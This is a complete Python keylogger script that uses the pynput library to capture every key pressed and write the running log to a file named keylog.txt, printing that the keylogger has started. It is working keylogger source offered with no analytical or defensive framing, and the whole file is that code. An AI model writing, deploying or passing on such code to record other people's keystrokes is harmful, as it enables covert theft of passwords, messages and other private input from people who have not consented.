import pynput.keyboard

log = ""

def on_press(key):
    global log
    try:
        log += key.char  # Add the character pressed
    except AttributeError:
        if key == key.space:
            log += " "  # Add space for spacebar
        else:
            log += f" [{key}] "  # For special keys like enter, shift, etc.

    # Save everything typed to a file called keylog.txt
    with open("keylog.txt", "w") as f:
        f.write(log)

def main():
    print("Keylogger started... (Press Ctrl+C to stop)")
    listener = pynput.keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()

if __name__ == "__main__":
    main()
